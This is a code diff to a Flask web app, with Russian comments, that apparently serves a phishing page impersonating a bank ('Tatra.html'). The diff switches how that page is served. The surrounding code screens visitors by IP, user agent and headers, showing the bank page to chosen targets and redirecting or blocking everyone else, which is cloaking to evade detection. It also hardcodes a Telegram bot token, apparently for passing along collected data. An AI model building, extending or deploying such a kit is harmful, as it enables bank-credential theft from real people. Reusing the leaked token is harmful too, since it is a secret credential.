@@ -1,10 +1,14 @@
-from flask import Flask, render_template, request, jsonify, redirect
+from flask import Flask, render_template, request, jsonify, redirect, send_from_directory
 import requests
 import os
 import json
 import time
 
 app = Flask(__name__)
+
+def send_bank_page():
+    """Отдаёт Tatra.html как статический файл (обход Jinja2)"""
+    return send_from_directory(app.template_folder, 'Tatra.html')
 
 # Telegram настройки (те же что в vbb)
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8666389425:AAE1tzMvNPHJ57aGj-aQdNMXf7gGn0tWWM0')
@@ -137,7 +141,7 @@ def index():
     action, data = check_visitor(ip, user_agent, headers_dict, domain)
     
     if action == 'bank':
-        return render_template('Tatra.html')
+        return send_bank_page()
     elif action == 'redirect':
         return redirect(data.get('redirect_url', SAFE_URL))
     elif action == 'block':
@@ -148,7 +152,7 @@ def index():
 @app.route('/bank')
 def bank():
     """Прямой доступ к странице банка"""
-    return render_template('Tatra.html')
+    return send_bank_page()
 
 @app.route('/loading')
 def loading():
